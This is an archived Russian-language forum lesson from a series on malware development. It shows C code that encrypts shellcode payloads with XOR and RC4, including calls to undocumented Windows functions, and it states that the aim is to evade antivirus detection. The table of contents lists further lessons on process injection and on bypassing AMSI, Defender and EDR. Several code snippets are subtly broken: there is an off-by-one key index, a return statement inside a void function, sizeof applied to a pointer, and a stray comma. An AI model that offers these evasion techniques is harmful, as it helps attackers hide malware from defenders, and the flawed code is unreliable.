+            box-shadow:0 0 8px rgba(0,0,0,.1);
+            width:100%;
+            max-width:clamp(480px,90vw,1200px);
+            margin:0 auto;
+            box-sizing:border-box;
+            overflow:hidden;">
+
+  <div class="block-container">
+    <h3 class="block-header"
+        style="font-size:clamp(1rem,4vw,1.125rem);
+               margin:0 0 10px 0;">
+      📡 Наши контакты
+    </h3>
+
+    <div class="block-body" style="line-height:1.4;">
+
+      <!-- Email -->
+      <p style="margin:8px 0;">
+        ✉️ Email:
+        <a href="../../../../cdn-cgi/l/email-protection.html#e68f888089a689958f8892d2d4c885898b" style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          <span class="__cf_email__" data-cfemail="224b4c444d624d514b4c5616100c414d4f">[email&#160;protected]</span>
+        </a>
+      </p>
+
+      <!-- TOR Mirror -->
+      <p style="margin:8px 0;">
+        🧅 TOR зеркало:
+        <a href="http://oiiph5yud65awuv7vyzknbihyuumv5q2etcrgh6z4xmgnsul3chnigyd.onion/"
+           target="_blank"
+           rel="noopener noreferrer"
+           style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          oiiph5yud65awuv7vyzknbihyuumv5q2etcrgh6z4xmgnsul3chnigyd.onion
+        </a>
+      </p>
+
+      <!-- Donate -->
+      <p style="margin:8px 0;">
+        💰 Donate (BTC):
+        <a href="bitcoin:bc1qm3mmvdp05d0q0y4ea3tw8rvrn2e0cpcmmmwxgz"
+           style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          bc1qm3mmvdp05d0q0y4ea3tw8rvrn2e0cpcmmmwxgz
+        </a>
+      </p>
+
+      <!-- Notice -->
+      <p style="margin:15px 0 0;
+                padding:10px;
+                border-radius:6px;
+                background:#ffeaea;
+                color:#c0392b;
+                font-weight:bold;
+                text-align:center;">
+        ⚠️ Это архив форума, в ближайшее время поддержка ресурса не планируется!
+      </p>
+
+    </div>
+  </div>
+</div>
+		</div>
+	</li>
+
+			
+		</ul>
+	
+
+			
+
+			
+
+			
+			
+	
+		<ul class="p-breadcrumbs "
+			itemscope itemtype="https://schema.org/BreadcrumbList">
+			
+				
+
+				
+				
+
+				
+
+				
+				
+					
+					
+	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+		<a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
+			<span itemprop="name">Уроки разработки вредоносного софта</span>
+		</a>
+		<meta itemprop="position" content="1" />
+	</li>
+
+				
+			
+		</ul>
+	
+
+			
+
+			
+	<noscript class="js-jsWarning"><div class="blockMessage blockMessage--important blockMessage--iconic u-noJsOnly">JavaScript отключён. Для полноценно использования нашего сайта, пожалуйста, включите JavaScript в своём браузере.</div></noscript>
+
+			
+	<div class="blockMessage blockMessage--important blockMessage--iconic js-browserWarning" style="display: none">Вы используете устаревший браузер. Этот и другие сайты могут отображаться в нем неправильно.<br />Необходимо обновить браузер или попробовать использовать <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">другой</a>.</div>
+
+
+			
+				<div class="p-body-header">
+					
+		<div class="contentRow contentRow--hideFigureNarrow">
+			<div class="contentRow-main">
+				<div class="p-title">
+					<h1 class="p-title-value">
+						
+							
+							Цикл статей &quot;Изучение вредоносных программ&quot;
+						
+					</h1>
+				</div>
+				
+					<div class="p-description">
+						
+							<ul class="listInline listInline--bullet">
+								<li>
+									<i class="fa--xf far fa-user "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Автор</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#user"></use></svg></i>
+									<span class="u-srOnly">Автор</span>
+									
+										<a href="https://osint42.org/members/0x42.1/" class="username  u-concealed" dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a>
+									
+								</li>
+								
+								<li>
+									<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Дата публикации</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
+									<span class="u-srOnly">Дата публикации</span>
+
+									<a href="../../index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-05-08T13:54:22+0300" data-timestamp="1746701662" data-date="08.05.2025" data-time="13:54" data-short="8 Май" title="08.05.2025 в 13:54">08.05.2025</time></a>
+								</li>
+																
+									<li>
+										<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Последнее обновление</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
+										<span class="u-concealed">Обновлено</span>
+
+										<time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time>
+									</li>
+								
+																
+									<li>
+										<i class="fa--xf far fa-hourglass "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Article read time</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#hourglass"></use></svg></i>
+										<span class="u-srOnly">Article read time</span>
+
+										398 min read
+									</li>
+								
+								
+								
+									<li><span class="label label--accent">Рекомендуемые</span></li>
+								
+							</ul>
+						
+					</div>
+				
+
+				
+
+	
+		
+	
+
+			</div>
+		</div>
+	
+				</div>
+				
+
+			<div class="p-body-main p-body-main--withSidebar ">
+				
+				<div class="p-body-contentCol"></div>
+				
+					<div class="p-body-sidebarCol"></div>
+				
+
+				
+
+				<div class="p-body-content">
+					
+					<div class="p-body-pageContent">
+
+
+
+
+
+
+
+
+
+	
+
+	
+
+
+
+	
+	
+
+	
+
+
+
+
+	
+
+
+
+
+	
+
+
+
+
+
+
+
+	
+
+
+
+	
+
+
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+
+
+
+
+
+
+
+	
+		
+		
+
+		
+			<script data-cfasync="false" src="../../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script class="js-extraPhrases" type="application/json">
+			{
+				"lightbox_close": "Закрыть",
+				"lightbox_next": "Следующая",
+				"lightbox_previous": "Предыдущая",
+				"lightbox_error": "Запрошенный контент не может быть загружен. Пожалуйста, попробуйте позже.",
+				"lightbox_start_slideshow": "Запустить слайд-шоу",
+				"lightbox_stop_slideshow": "Остановить слайд-шоу",
+				"lightbox_full_screen": "Полный экран",
+				"lightbox_thumbnails": "Миниатюры",
+				"lightbox_download": "Скачать",
+				"lightbox_share": "Поделиться",
+				"lightbox_zoom": "Увеличить",
+				"lightbox_new_window": "Новое окно",
+				"lightbox_toggle_sidebar": "Переключить боковую панель"
+			}
+			</script>
+		
+		
+	
+
+
+<div class="block">
+	
+		<div class="block-outer">
+			<div class="block-outer-opposite">
+			
+				
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		<div class="buttonGroup">
+		
+			
+
+			
+			
+			
+			
+
+	
+
+			
+			
+				<div class="buttonGroup-buttonWrapper">
+					<button type="button" class="button button--link menuTrigger" data-xf-click="menu" aria-expanded="false" aria-haspopup="true" title="Навигация по страницам"><span class="button-text">
+						ОГЛАВЛЕНИЕ
+					</span></button>
+					<div class="menu" data-menu="menu" aria-hidden="true">
+						<div class="menu-content">
+							<h4 class="menu-header">Выберите страницу</h4>
+
+							<a href="../../index.html" class="menu-linkRow ">
+								
+									Зачем изучать разработку вредоносных программ ?
+								
+							</a>
+
+							
+								
+									<a href="../instrumenty.1/index.html" class="menu-linkRow ">
+									 Инструменты</a>
+								
+									<a href="../tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="menu-linkRow ">
+									 Так какой-же язык выбрать !?</a>
+								
+									<a href="../shpargalka-po-arkhitekture-vindy.3/index.html" class="menu-linkRow ">
+									 Шпаргалка по архитектуре винды</a>
+								
+									<a href="../chto-takoye-payload-i-shell-code.5/index.html" class="menu-linkRow ">
+									 Что такое payload и shell code</a>
+								
+									<a href="../izuchayem-dinamicheskiye-biblioteki.6/index.html" class="menu-linkRow ">
+									 Изучаем динамические библиотеки</a>
+								
+									<a href="../protsessy-windows.7/index.html" class="menu-linkRow ">
+									 Процессы Windows</a>
+								
+									<a href="../vidy-detektov.8/index.html" class="menu-linkRow ">
+									 Виды детектов</a>
+								
+									<a href="../kuda-klast-nagruzku.9/index.html" class="menu-linkRow ">
+									 Куда класть нагрузку ?</a>
+								
+									<a href="index.html" class="menu-linkRow is-selected">
+									 Шифруем Payload</a>
+								
+									<a href="../obfuskatsiya-payload.11/index.html" class="menu-linkRow ">
+									 Обфускация Payload</a>
+								
+									<a href="../lokal-nyi-zapusk-payload.12/index.html" class="menu-linkRow ">
+									 Локальный запуск Payload</a>
+								
+									<a href="../in-yektsiya-v-protsess.13/index.html" class="menu-linkRow ">
+									 Иньекция в процесс</a>
+								
+									<a href="../in-yektsiya-shell-koda-v-protsess.14/index.html" class="menu-linkRow ">
+									 Инъекция шелл-кода в процесс</a>
+								
+									<a href="../razmeshchayem-payload-udalenno-na-servere.15/index.html" class="menu-linkRow ">
+									 Размещаем Payload удаленно на сервере</a>
+								
+									<a href="../pryachem-payload-v-reyestre.16/index.html" class="menu-linkRow ">
+									 Прячем Payload в реестре</a>
+								
+									<a href="../razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="menu-linkRow ">
+									 Разборка с цифровой подписью зверька</a>
+								
+									<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html" class="menu-linkRow ">
+									 Изучаем технику Thread Hijacking</a>
+								
+									<a href="../opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="menu-linkRow ">
+									 Определение PID нужного процесса, или перечисления процессов</a>
+								
+									<a href="../izuchayem-tekhniku-apc-injection.20/index.html" class="menu-linkRow ">
+									 Изучаем технику APC Injection</a>
+								
+									<a href="../vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="menu-linkRow ">
+									 Вызов кода через функции обратного вызова</a>
+								
+									<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="menu-linkRow ">
+									 Инъекция отображаемой памяти</a>
+								
+									<a href="../izuchayem-tekhniku-stomping-injection.23/index.html" class="menu-linkRow ">
+									 Изучаем технику Stomping Injection</a>
+								
+									<a href="../kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="menu-linkRow ">
+									 Контроль выполнения полезной нагрузки</a>
+								
+									<a href="../izuchayem-tekhniku-spoofing.25/index.html" class="menu-linkRow ">
+									 Изучаем технику Spoofing</a>
+								
+									<a href="../skrytiye-strok.26/index.html" class="menu-linkRow ">
+									 Скрытие строк</a>
+								
+									<a href="../izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="menu-linkRow ">
+									 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
+								
+									<a href="../kungfu-2-izuchayem-api-hooking.28/index.html" class="menu-linkRow ">
+									 Кунгфу-2.Изучаем API Hooking</a>
+								
+									<a href="../predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="menu-linkRow ">
+									 Предельная техника. Разборка с сисколами</a>
+								
+									<a href="../predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="menu-linkRow ">
+									 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
+								
+									<a href="../cherpayem-sily-v-antiotladke.31/index.html" class="menu-linkRow ">
+									 Черпаем силы в антиотладке</a>
+								
+									<a href="../obkhod-virtual-nykh-mashin.32/index.html" class="menu-linkRow ">
+									 Обход виртуальных машин</a>
+								
+									<a href="../otkryvayem-vrata-ada.33/index.html" class="menu-linkRow ">
+									 Открываем врата ада</a>
+								
+									<a href="../umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="menu-linkRow ">
+									 Уменьшение вероятности детекта зверька</a>
+								
+									<a href="../obkhod-windows-defender.35/index.html" class="menu-linkRow ">
+									 Обход Windows defender</a>
+								
+									<a href="../pro-endpoint-detection-and-response-edr.36/index.html" class="menu-linkRow ">
+									 Про Endpoint Detection and Response (EDR)</a>
+								
+									<a href="../pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="menu-linkRow ">
+									 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
+								
+									<a href="../ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="menu-linkRow ">
+									 Огромная база исходников современных вирусов для разных платформ</a>
+								
+									<a href="../kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="menu-linkRow ">
+									 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
+								
+									<a href="../obkhod-amsi.40/index.html" class="menu-linkRow ">
+									 Обход AMSI</a>
+								
+									<a href="../obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="menu-linkRow ">
+									 Обход AMSI при помощи хардварных точек останова</a>
+								
+									<a href="../uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="menu-linkRow ">
+									 Уклоняемся от поведенческого детекта антивируса и EDR</a>
+								
+									<a href="../obkhodim-antivirusy-i-edr.43/index.html" class="menu-linkRow ">
+									 Обходим антивирусы и EDR</a>
+								
+									<a href="../mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="menu-linkRow ">
+									 MutationGate - Новый подход работы с сисколами</a>
+								
+									<a href="../razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="menu-linkRow ">
+									 Разработка настоящего вируса в 2024 году</a>
+								
+							
+							
+								<a href="../../index9401.html?full=1" class="menu-linkRow ">Просмотреть всю статью</a>
+							
+						</div>
+					</div>
+				</div>
+			
+
+			
+
+			
+		
+		</div>
+	
+
+			
+			</div>
+		</div>
+	
+
+	
+	
+	
+	
+		
+
+	<div class="block-container">
+		<div class="block-body lbContainer js-articleBody"
+			data-xf-init="lightbox"
+			data-lb-id="article-6"
+			data-lb-caption-desc="0x42 &middot; 08.05.2025 в 13:54"
+			id="js-articleBody-6">
+
+			<div class="articleBody">
+				<article class="articleBody-main js-lbContainer">
+					
+					
+
+					<h2>Шифруем Payload</h2>
+
+					
+
+						
+
+					<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746773556787.png"
+		data-src="https://osint42.org/attachments/1746773556787-png.72/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773556787-png.72/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773556787.png"
+			title="1746773556787.png"
+			width="450" height="230" loading="lazy" />
+	</div><br />
+<br />
+В предыдущей статье мы рассмотрели где хранить полезную нагрузку (Payload), но как было сказано в коментарии к статье, для обхода детекта нужно много чего сделать, в частности нужно зашифровать Payload и ещё позаботится об антиэмуляции и скрытия поведения.<br />
+<br />
+В этой статье рассмотрим пока-что как шифровать.)<br />
+<br />
+<b>Шифрование с использованием XOR</b><br />
+<br />
+Шифрование с использованием XOR является самым простым в использовании и легким в реализации, что делает его популярным выбором для вредоносных программ. Оно быстрее, чем AES и RC4, и не требует дополнительных библиотек или использования API Windows. Кроме того, это симметричный алгоритм шифрования, который позволяет использовать одну и ту же функцию как для шифрования, так и для дешифрования.<br />
+<br />
+<b>Шифрование XOR</b> Приведенный ниже фрагмент кода показывает базовую функцию шифрования XOR. Функция просто применяет операцию XOR к каждому байту шеллкода с 1-байтовым ключом.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
+    - pShellcode : Base address of the payload to encrypt
+    - sShellcodeSize : The size of the payload
+    - bKey : A single arbitrary byte representing the key for encrypting the payload
+*/
+VOID XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
+    for (size_t i = 0; i &lt; sShellcodeSize; i++){
+        pShellcode[i] = pShellcode[i] ^ bKey;
+    }
+}</code></pre>
+	</div>
+</div><br />
+<b>Дополнение:</b> Хотя XOR обладает определенными преимуществами в виде скорости и простоты, он не считается безопасным для большинства серьезных приложений шифрования. Если атакующий имеет доступ к исходному и зашифрованному текстам, он может легко восстановить ключ. Кроме того, если один и тот же ключ используется многократно, это также может привести к уязвимостям.<br />
+<br />
+<b>Защита ключа шифрования</b><br />
+<br />
+Некоторые инструменты и решения по безопасности могут подбирать ключ методом грубой силы, что позволит расшифровать шеллкод. Чтобы усложнить подбор ключа этим инструментам, приведенный ниже код вносит незначительные изменения, увеличивая ключевое пространство за счет добавления переменной i к ключу. Теперь, когда ключевое пространство значительно больше, гораздо сложнее подобрать ключ методом грубой силы.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
+    - pShellcode : Базовый адрес полезной нагрузки для шифрования
+    - sShellcodeSize : Размер полезной нагрузки
+    - bKey : Один произвольный байт, представляющий ключ для шифрования полезной нагрузки
+*/
+VOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
+    for (size_t i = 0; i &lt; sShellcodeSize; i++) {
+        pShellcode[i] = pShellcode[i] ^ (bKey + i);
+    }
+}</code></pre>
+	</div>
+</div><br />
+Приведенный выше фрагмент кода все же можно сделать более надежным. В следующем фрагменте кода процесс шифрования осуществляется с ключом, используя каждый байт ключа повторно, что усложняет взлом ключа.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
+    - pShellcode : Базовый адрес полезной нагрузки для шифрования
+    - sShellcodeSize : Размер полезной нагрузки
+    - bKey : Случайный массив байтов определенного размера
+    - sKeySize : Размер ключа
+*/
+VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
+    for (size_t i = 0, j = 0; i &lt; sShellcodeSize; i++, j++) {
+        if (j &gt; sKeySize){
+            j = 0;
+        }
+        pShellcode[i] = pShellcode[i] ^ bKey[j];
+    }
+}</code></pre>
+	</div>
+</div><br />
+<b>Заключение</b><br />
+<br />
+Рекомендуется использовать шифрование XOR для небольших задач, таких как скрытие строк.<br />
+Однако для более крупных полезных нагрузок рекомендуется использовать более безопасные методы шифрования, такие как AES.<br />
+<br />
+<b>Шифрование полезной нагрузки - RC4</b><br />
+<br />
+Введение RC4 - это быстрый и эффективный потоковый шифр, который также является симметричным алгоритмом шифрования, позволяющим использовать одну и ту же функцию как для шифрования, так и для дешифрования.<br />
+<br />
+Есть несколько реализаций RC4 на C, доступных публично, но в этой статье  будут продемонстрированы три способа выполнения шифрования RC4.<br />
+<br />
+Примечание: главная цель этой статьи - не вникать в детали работы алгоритма RC4, а шифровать полезную нагрузку для избежания обнаружения.<br />
+<br />
+<b>RC4 Шифрование - Метод 1</b><br />
+<br />
+Существуют две функции rc4Init и rc4Cipher, которые используются для инициализации структуры rc4context и выполнения шифрования RC4 соответственно.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
+{
+    unsigned int i;
+    unsigned int j;
+    unsigned char s[256];
+
+} Rc4Context;
+
+
+void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
+{
+    unsigned int i;
+    unsigned int j;
+    unsigned char temp;
+
+    // Check parameters
+    if (context == NULL || key == NULL)
+        return ERROR_INVALID_PARAMETER;
+
+    // Clear context
+    context-&gt;i = 0;
+    context-&gt;j = 0;
+
+    // Initialize the S array with identity permutation
+    for (i = 0; i &lt; 256; i++)
+    {
+        context-&gt;s[i] = i;
+    }
+
+    // S is then processed for 256 iterations
+    for (i = 0, j = 0; i &lt; 256; i++)
+    {
+        //Randomize the permutations using the supplied key
+        j = (j + context-&gt;s[i] + key[i % length]) % 256;
+
+        //Swap the values of S[i] and S[j]
+        temp = context-&gt;s[i];
+        context-&gt;s[i] = context-&gt;s[j];
+        context-&gt;s[j] = temp;
+    }
+
+}
+
+
+void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length){
+    unsigned char temp;
+
+    // Restore context
+    unsigned int i = context-&gt;i;
+    unsigned int j = context-&gt;j;
+    unsigned char* s = context-&gt;s;
+
+    // Encryption loop
+    while (length &gt; 0)
+    {
+        // Adjust indices
+        i = (i + 1) % 256;
+        j = (j + s[i]) % 256;
+
+        // Swap the values of S[i] and S[j]
+        temp = s[i];
+        s[i] = s[j];
+        s[j] = temp;
+
+        // Valid input and output?
+        if (input != NULL &amp;&amp; output != NULL)
+        {
+            //XOR the input data with the RC4 stream
+            *output = *input ^ s[(s[i] + s[j]) % 256];
+
+            //Increment data pointers
+            input++;
+            output++;
+        }
+
+        // Remaining bytes to process
+        length--;
+    }
+
+    // Save context
+    context-&gt;i = i;
+    context-&gt;j = j;
+}</code></pre>
+	</div>
+</div><br />
+Пример шифрования:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>    // Initialization
+    Rc4Context ctx = { 0 };
+
+    // Key used for encryption
+    unsigned char* key = &quot;ru-sfera.pw&quot;;
+    rc4Init(&amp;ctx, key, sizeof(key));
+
+    // Encryption //
+    // plaintext - The payload to be encrypted
+    // ciphertext - A buffer that is used to store the outputted encrypted data
+    rc4Cipher(&amp;ctx, plaintext, ciphertext, sizeof(plaintext));</code></pre>
+	</div>
+</div><br />
+Пример расшифровки:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Initialization
+    Rc4Context ctx = { 0 };
+
+    // Key used to decrypt
+    unsigned char* key = &quot;ru-sfera.pw&quot;;
+    rc4Init(&amp;ctx, key, sizeof(key));
+
+    // Decryption //
+    // ciphertext - Encrypted payload to be decrypted
+    // plaintext - A buffer that is used to store the outputted plaintext data
+    rc4Cipher(&amp;ctx, ciphertext, plaintext, sizeof(ciphertext));</code></pre>
+	</div>
+</div><br />
+<b>RC4 Шифрование - Метод 2</b><br />
+<br />
+Неудокументированный Windows NTAPI SystemFunction032 предлагает более быструю и меньшую реализацию алгоритма RC4.<br />
+<br />
+<b>Использование SystemFunction032 для шифрования с помощью RC4</b><br />
+<br />
+Функция SystemFunction032 представляет собой неудокументированное API Windows, которое предоставляет реализацию алгоритма шифрования RC4. Несмотря на то что это API не документировано Microsoft, оно широко известно и используется разработчиками программного обеспечения, в том числе благодаря таким проектам, как Wine, который предоставляет дополнительные сведения об этой функции.<br />
+<br />
+<b>SystemFunction032</b><br />
+<br />
+В соответствии с документацией на странице Wine API, функция SystemFunction032 принимает два параметра типа USTRING.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS SystemFunction032
+(
+ struct ustring* data,
+const struct ustring* key
+)</code></pre>
+	</div>
+</div><br />
+<b>Структура USTRING</b><br />
+<br />
+Поскольку это неудокументированное API, структура USTRING изначально неизвестна. Однако, благодаря дополнительным исследованиям и ресурсам, таким как Wine, стало возможным определить эту структуру:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
+{
+DWORD Length; // Размер данных для шифрования/дешифрования
+DWORD MaximumLength; // Максимальный размер данных для шифрования/дешифрования
+PVOID Buffer; // Базовый адрес данных для шифрования/дешифрования
+} USTRING;</code></pre>
+	</div>
+</div><br />
+<b>Использование SystemFunction032</b><br />
+<br />
+Для использования SystemFunction032 необходимо сначала получить ее адрес. Эта функция экспортируется из advapi32.dll, поэтому эту DLL необходимо загрузить в процесс с помощью функции LoadLibrary. Возвращаемое значение этой функции может быть непосредственно использовано в GetProcAddress для получения адреса SystemFunction032.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnSystemFunction032 SystemFunction032 = (fnSystemFunction032) GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);</code></pre>
+	</div>
+</div><br />
+Функция указателя на SystemFunction032 определена как тип данных fnSystemFunction032:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS(NTAPI* fnSystemFunction032)(
+struct USTRING* Data,   // Структура типа USTRING, содержащая информацию о буфере для шифрования/дешифрования
+struct USTRING* Key     // Структура типа USTRING, содержащая информацию о ключе, используемом при шифровании/дешифровании
+);</code></pre>
+	</div>
+</div><br />
+Затем можно использовать SystemFunction032 для шифрования и дешифрования данных, передавая соответствующий ключ и данные в структурах USTRING.<br />
+<br />
+Важно отметить, что использование неудокументированных функций может быть рискованным, так как поведение или доступность таких функций может измениться в будущих версиях ОС или обновлениях.<br />
+<br />
+Пример использование функции SystemFunction032:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
+{
+    DWORD    Length;
+    DWORD    MaximumLength;
+    PVOID    Buffer;
+
+} USTRING;
+
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(
+    struct USTRING* Data,
+    struct USTRING* Key
+);
+
+/*
+Helper function that calls SystemFunction032
+* pRc4Key - The RC4 key use to encrypt/decrypt
+* pPayloadData - The base address of the buffer to encrypt/decrypt
+* dwRc4KeySize - Size of pRc4key (Param 1)
+* sPayloadSize - Size of pPayloadData (Param 2)
+*/
+BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+    NTSTATUS STATUS    = NULL;
+
+    USTRING Data = {
+        .Buffer         = pPayloadData,
+        .Length         = sPayloadSize,
+        .MaximumLength  = sPayloadSize
+    };
+
+    USTRING    Key = {
+        .Buffer         = pRc4Key,
+        .Length         = dwRc4KeySize,
+        .MaximumLength  = dwRc4KeySize
+    },
+
+    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);
+
+    if ((STATUS = SystemFunction032(&amp;Data, &amp;Key)) != 0x0) {
+        printf(&quot;[!] SystemFunction032 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
+        return FALSE;
+    }
+
+    return TRUE;
+}</code></pre>
+	</div>
+</div><br />
+<b>RC4 Шифрование - Метод 3</b><br />
+<br />
+Еще один способ реализации алгоритма RC4 - использование SystemFunction033, которое принимает те же параметры, что и ранее показанная функция SystemFunction032.<br />
+<br />
+
+	
+	
+
+
+
